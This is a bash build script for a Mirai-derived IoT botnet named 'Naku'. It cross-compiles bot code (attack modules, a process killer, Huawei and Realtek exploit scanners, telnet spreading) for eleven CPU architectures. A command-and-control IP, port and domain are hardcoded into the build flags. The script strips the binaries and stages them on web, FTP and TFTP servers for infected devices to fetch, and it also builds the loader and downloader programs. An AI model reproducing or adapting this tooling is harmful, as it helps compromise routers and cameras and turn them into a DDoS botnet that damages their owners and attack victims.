#!/bin/bash
# set -e  # Exit on any error - disabled to allow partial builds
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
function compile_bot {
    echo "Compiling $1 -> $2"
    # Compile only essential bot files, excluding problematic scanner files
    if "$1-gcc" -std=c99 $3 bot/main.c bot/attack.c bot/attack_method.c bot/killer.c bot/rand.c bot/util.c bot/table.c bot/checksum.c bot/resolv.c bot/huawei_scanner.c bot/huawei1_scanner.c bot/realtek_scanner.c bot/telnet.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /root/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"; then
        echo "Successfully compiled $2"
        if "$1-strip" /root/release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null; then
            echo "Successfully stripped $2"
        else
            echo "Warning: Failed to strip $2, but binary was created"
        fi
    else
        echo "Error: Failed to compile $2 for $1"
    fi
}

rm -rf /root/release
mkdir -p /root/release
rm -rf /root/proj/dlr/release
mkdir -p /root/proj/dlr/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins
cd /root/proj
export GOPATH=/root/proj
export GO111MODULE=off
# Skip Go builds for now - focus on C compilation
# go build -o /root/proj/loader/cnc cnc/*.go
# rm -rf ~/cnc
# mv /root/proj/loader/cnc ~/
# go build -o /root/proj/loader/scanListen scanListen.go

FLAGS="-DUSEDOMAIN -DCNCIP=0xb693f82d -DCNCPORT=15412 -DSERVDOM=\"bigbomboclaat.corestresser.cc\" -DSCANNER -DSCAN_MAX"

compile_bot i586 Naku.x86 "-static $FLAGS"
compile_bot mips Naku.mips "-static $FLAGS"
compile_bot mipsel Naku.mpsl "-static $FLAGS"
compile_bot armv4l Naku.arm "-static $FLAGS"
compile_bot armv5l Naku.arm5 "-static $FLAGS"
compile_bot armv6l Naku.arm6 "-static $FLAGS"
compile_bot armv7l Naku.arm7 "-static $FLAGS"
compile_bot powerpc Naku.ppc "-static $FLAGS"
compile_bot sparc Naku.spc "-static $FLAGS"
compile_bot m68k Naku.m68k "-static $FLAGS"
compile_bot sh4 Naku.sh4 "-static $FLAGS"

cp /root/release/Naku.* /var/www/html/bins
cp /root/release/Naku.* /var/ftp
cp /root/release/Naku.* /var/lib/tftpboot

gcc -static -O3 -lpthread -pthread /root/proj/loader/src/*.c -o /root/proj/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/proj/dlr/main.c -o /root/proj/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/proj/dlr/release/dlr.spc
cp /root/proj/dlr/release/dlr* /root/proj/loader/bins

echo "Build completed. Binaries created:"
echo "Naku binaries in /root/release/:"
ls -la /root/release/
echo ""
echo "dlr binaries in /root/proj/dlr/release/:"
ls -la /root/proj/dlr/release/